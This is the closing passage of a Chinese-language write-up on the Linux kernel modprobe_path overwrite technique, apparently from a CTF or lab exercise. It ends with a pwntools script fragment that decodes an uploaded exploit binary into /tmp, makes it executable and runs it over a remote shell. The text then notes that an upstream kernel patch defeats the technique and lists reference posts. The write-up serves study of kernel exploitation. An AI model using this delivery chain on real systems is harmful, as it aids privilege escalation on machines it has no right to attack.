io.sendline(b'base64 -d /tmp/exp.gz.b64 | gunzip > /tmp/exp')
io.recvuntil(b'/ $')
io.sendline(b'chmod +x /tmp/exp')
io.recvuntil(b'/ $')

io.sendline(b'/tmp/exp')
output = io.recvall(timeout=20).decode(errors='ignore')
print(output)
```

## 后言

由于这个[补丁](https://web.git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fa1bdca98d74472dcdb79cb948b54f63b5886c04)被合并到上游内核，导致覆盖`modprobe_path`这个利用方法在新版本内核中作废了。

## 参考

>[Linux 内核利用技术：覆盖modprobe_path - Midas 的博客](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique)
[复兴modprobe_path技术：克服search_binary_handler（）补丁 - Theori BLOG](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
